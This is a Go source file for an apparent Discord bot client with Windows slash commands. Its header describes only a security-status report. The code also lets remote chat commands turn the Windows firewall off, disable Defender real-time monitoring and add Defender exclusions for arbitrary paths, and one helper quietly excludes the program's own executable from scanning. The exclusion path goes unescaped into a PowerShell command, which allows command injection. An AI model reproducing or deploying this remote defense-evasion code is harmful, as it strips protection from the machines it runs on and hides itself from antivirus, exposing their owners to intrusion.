package main

// This file contains Windows-specific slash commands such as winsec, which
// summarizes local firewall and Defender real-time protection status.
//
// The implementation is safe to compile on non-Windows platforms but will
// return a clear "unsupported" message at runtime when GOOS != windows.

import (
	"fmt"
	"log"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"

	"github.com/bwmarrin/discordgo"
)

// handleSlashWinSec reports Windows firewall and Defender real-time protection
// status in a single ephemeral message.
func handleSlashWinSec(s *discordgo.Session, i *discordgo.InteractionCreate) {
	if runtime.GOOS != "windows" {
		s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
			Type: discordgo.InteractionResponseChannelMessageWithSource,
			Data: &discordgo.InteractionResponseData{
				Content: "This command is only available on Windows clients.",
				Flags:   discordgo.MessageFlagsEphemeral,
			},
		})
		return
	}

	firewall, fwErr := windowsFirewallStatus()
	defender, defErr := windowsDefenderStatus()

	if fwErr != nil {
		firewall = fmt.Sprintf("unknown (error: %s)", truncateError(fwErr.Error(), 120))
	}
	if defErr != nil {
		defender = fmt.Sprintf("unknown (error: %s)", truncateError(defErr.Error(), 120))
	}

	content := fmt.Sprintf(
		"🛡 Windows security status\n\n"+
			"• Firewall: **%s**\n"+
			"• Defender real-time protection: **%s**",
		firewall,
		defender,
	)

	s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
		Type: discordgo.InteractionResponseChannelMessageWithSource,
		Data: &discordgo.InteractionResponseData{
			Content: content,
			Flags:   discordgo.MessageFlagsEphemeral,
		},
	})
}

func windowsFirewallStatus() (string, error) {
	if runtime.GOOS != "windows" {
		return "unsupported", nil
	}
	cmd := exec.Command("netsh", "advfirewall", "show", "allprofiles")
	out, err := cmd.CombinedOutput()
	if err != nil {
		return "", fmt.Errorf("netsh advfirewall failed: %w; output=%s", err, truncateError(string(out), 200))
	}
	lines := strings.Split(strings.ToLower(string(out)), "\n")
	enabled := false
	disabled := false
	for _, raw := range lines {
		line := strings.TrimSpace(raw)
		if !strings.HasPrefix(line, "state") {
			continue
		}
		if strings.Contains(line, "on") {
			enabled = true
		}
		if strings.Contains(line, "off") {
			disabled = true
		}
	}
	switch {
	case enabled && !disabled:
		return "enabled", nil
	case !enabled && disabled:
		return "disabled", nil
	case enabled && disabled:
		return "mixed (some profiles enabled, some disabled)", nil
	default:
		return "unknown", nil
	}
}

func windowsDefenderStatus() (string, error) {
	if runtime.GOOS != "windows" {
		return "unsupported", nil
	}
	script := `try { (Get-MpComputerStatus).RealTimeProtectionEnabled } catch { "" }`
	cmd := exec.Command("powershell", "-NoLogo", "-NonInteractive", "-Command", script)
	out, err := cmd.Output()
	if err != nil {
		return "", fmt.Errorf("Get-MpComputerStatus failed: %w; output=%s", err, truncateError(string(out), 200))
	}
	val := strings.TrimSpace(strings.ToLower(string(out)))
	switch val {
	case "true":
		return "enabled", nil
	case "false":
		return "disabled", nil
	case "":
		return "unknown", nil
	default:
		return "unknown (" + val + ")", nil
	}
}

func truncateError(s string, max int) string {
	if len(s) <= max {
		return s
	}
	return s[:max]
}

func defenderExclusionExists(path string) (bool, error) {
	if runtime.GOOS != "windows" {
		return false, nil
	}
	abs, _ := filepath.Abs(path)
	absLower := strings.ToLower(abs)
	script := `try { (Get-MpPreference).ExclusionPath -join "` + "`n" + `" } catch { "" }`
	cmd := exec.Command("powershell", "-NoLogo", "-NonInteractive", "-Command", script)
	out, err := cmd.Output()
	if err != nil {
		return false, fmt.Errorf("Get-MpPreference ExclusionPath failed: %w; output=%s", err, truncateError(string(out), 200))
	}
	lines := strings.Split(strings.ToLower(string(out)), "\n")
	for _, raw := range lines {
		line := strings.TrimSpace(raw)
		if line == "" {
			continue
		}
		if strings.EqualFold(line, absLower) {
			return true, nil
		}
	}
	return false, nil
}

func addDefenderExclusion(path string) error {
	if runtime.GOOS != "windows" {
		return nil
	}
	pathVal, _ := filepath.Abs(path)
	script := fmt.Sprintf(`try { Add-MpPreference -ExclusionPath "%s" -ErrorAction Stop; "ok" } catch { $_.Exception.Message }`, pathVal)
	cmd := exec.Command("powershell", "-NoLogo", "-NonInteractive", "-Command", script)
	out, err := cmd.CombinedOutput()
	result := strings.TrimSpace(string(out))
	if err != nil || !strings.EqualFold(result, "ok") {
		if result == "" && err != nil {
			result = err.Error()
		}
		return fmt.Errorf("Add-MpPreference failed for %q: %s", pathVal, truncateError(result, 200))
	}
	return nil
}

func ensureCurrentExeDefenderExcluded() error {
	if runtime.GOOS != "windows" {
		return nil
	}
	exe, err := os.Executable()
	if err != nil {
		return err
	}
	exe, _ = filepath.Abs(exe)
	exists, err := defenderExclusionExists(exe)
	if err != nil {
		log.Printf("Defender exclusion check failed for %s: %v", exe, err)
		return err
	}
	if exists {
		log.Printf("Defender exclusion already present for %s", exe)
		return nil
	}
	if err := addDefenderExclusion(exe); err != nil {
		log.Printf("Failed to add Defender exclusion for %s: %v", exe, err)
		return err
	}
	log.Printf("Added Defender exclusion for current executable: %s", exe)
	return nil
}

func handleSlashWinFirewall(s *discordgo.Session, i *discordgo.InteractionCreate, data discordgo.ApplicationCommandInteractionData) {
	if runtime.GOOS != "windows" {
		s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
			Type: discordgo.InteractionResponseChannelMessageWithSource,
			Data: &discordgo.InteractionResponseData{
				Content: "This command is only available on Windows clients.",
				Flags:   discordgo.MessageFlagsEphemeral,
			},
		})
		return
	}
	mode := ""
	for _, opt := range data.Options {
		if opt.Name == "mode" {
			if v, ok := opt.Value.(string); ok {
				mode = strings.ToLower(v)
			}
		}
	}
	if mode != "on" && mode != "off" {
		s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
			Type: discordgo.InteractionResponseChannelMessageWithSource,
			Data: &discordgo.InteractionResponseData{
				Content: "mode must be `on` or `off`",
				Flags:   discordgo.MessageFlagsEphemeral,
			},
		})
		return
	}

	cmd := exec.Command("netsh", "advfirewall", "set", "allprofiles", "state", mode)
	out, err := cmd.CombinedOutput()
	if err != nil {
		msg := fmt.Sprintf("Failed to set firewall %s: %s", mode, truncateError(string(out), 200))
		log.Printf("winfirewall command failed for mode=%s: %s", mode, truncateError(string(out), 200))
		s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
			Type: discordgo.InteractionResponseChannelMessageWithSource,
			Data: &discordgo.InteractionResponseData{
				Content: msg + "\n\nTry running the client as administrator.",
				Flags:   discordgo.MessageFlagsEphemeral,
			},
		})
		return
	}

	firewall, _ := windowsFirewallStatus()
	msg := fmt.Sprintf("Firewall set to **%s** (reported status: %s)", mode, firewall)
	log.Printf("winfirewall set mode=%s, reported status=%s", mode, firewall)
	if len(out) > 0 {
		msg += "\n\n" + "netsh output:\n```text\n" + truncateError(string(out), 400) + "\n```"
	}
	s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
		Type: discordgo.InteractionResponseChannelMessageWithSource,
		Data: &discordgo.InteractionResponseData{
			Content: msg,
			Flags:   discordgo.MessageFlagsEphemeral,
		},
	})
}

func handleSlashWinDefender(s *discordgo.Session, i *discordgo.InteractionCreate, data discordgo.ApplicationCommandInteractionData) {
	if runtime.GOOS != "windows" {
		s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
			Type: discordgo.InteractionResponseChannelMessageWithSource,
			Data: &discordgo.InteractionResponseData{
				Content: "This command is only available on Windows clients.",
				Flags:   discordgo.MessageFlagsEphemeral,
			},
		})
		return
	}
	mode := ""
	for _, opt := range data.Options {
		if opt.Name == "mode" {
			if v, ok := opt.Value.(string); ok {
				mode = strings.ToLower(v)
			}
		}
	}
	if mode != "on" && mode != "off" {
		s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
			Type: discordgo.InteractionResponseChannelMessageWithSource,
			Data: &discordgo.InteractionResponseData{
				Content: "mode must be `on` or `off`",
				Flags:   discordgo.MessageFlagsEphemeral,
			},
		})
		return
	}

	var script string
	if mode == "off" {
		script = `try { Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction Stop; "ok" } catch { $_.Exception.Message }`
	} else {
		script = `try { Set-MpPreference -DisableRealtimeMonitoring $false -ErrorAction Stop; "ok" } catch { $_.Exception.Message }`
	}
	cmd := exec.Command("powershell", "-NoLogo", "-NonInteractive", "-Command", script)
	out, err := cmd.CombinedOutput()
	result := strings.TrimSpace(string(out))
	if err != nil || !strings.EqualFold(result, "ok") {
		if result == "" {
			result = err.Error()
		}
		msg := fmt.Sprintf("Failed to set Defender real-time protection %s: %s", mode, truncateError(result, 200))
		log.Printf("windefender command failed for mode=%s: %s", mode, truncateError(result, 200))
		s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
			Type: discordgo.InteractionResponseChannelMessageWithSource,
			Data: &discordgo.InteractionResponseData{
				Content: msg + "\n\nTry running the client as administrator.",
				Flags:   discordgo.MessageFlagsEphemeral,
			},
		})
		return
	}

	status, _ := windowsDefenderStatus()
	msg := fmt.Sprintf("Defender real-time protection set to **%s** (reported status: %s)", mode, status)
	log.Printf("windefender set mode=%s, reported status=%s", mode, status)
	s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
		Type: discordgo.InteractionResponseChannelMessageWithSource,
		Data: &discordgo.InteractionResponseData{
			Content: msg,
			Flags:   discordgo.MessageFlagsEphemeral,
		},
	})
}

func handleSlashWinDefenderExclude(s *discordgo.Session, i *discordgo.InteractionCreate, data discordgo.ApplicationCommandInteractionData) {
	if runtime.GOOS != "windows" {
		s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
			Type: discordgo.InteractionResponseChannelMessageWithSource,
			Data: &discordgo.InteractionResponseData{
				Content: "This command is only available on Windows clients.",
				Flags:   discordgo.MessageFlagsEphemeral,
			},
		})
		return
	}

	var pathVal string
	for _, opt := range data.Options {
		if opt.Name == "path" {
			if v, ok := opt.Value.(string); ok {
				pathVal = v
			}
		}
	}
	if pathVal == "" {
		exe, err := os.Executable()
		if err != nil {
			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
				Type: discordgo.InteractionResponseChannelMessageWithSource,
				Data: &discordgo.InteractionResponseData{
					Content: "Could not determine executable path: " + truncateError(err.Error(), 200),
					Flags:   discordgo.MessageFlagsEphemeral,
				},
			})
			return
		}
		pathVal = exe
	}
	pathVal, _ = filepath.Abs(pathVal)

	if err := addDefenderExclusion(pathVal); err != nil {
		msg := fmt.Sprintf("Failed to add Defender exclusion for %q: %s", pathVal, truncateError(err.Error(), 200))
		log.Printf("windefenderexclude failed for %s: %v", pathVal, err)
		s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
			Type: discordgo.InteractionResponseChannelMessageWithSource,
			Data: &discordgo.InteractionResponseData{
				Content: msg + "\n\nTry running the client as administrator.",
				Flags:   discordgo.MessageFlagsEphemeral,
			},
		})
		return
	}

	msg := fmt.Sprintf("Added Defender exclusion for path:\n```text\n%s\n```", pathVal)
	log.Printf("windefenderexclude added exclusion for %s", pathVal)
	s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
		Type: discordgo.InteractionResponseChannelMessageWithSource,
		Data: &discordgo.InteractionResponseData{
			Content: msg,
			Flags:   discordgo.MessageFlagsEphemeral,
		},
	})
}
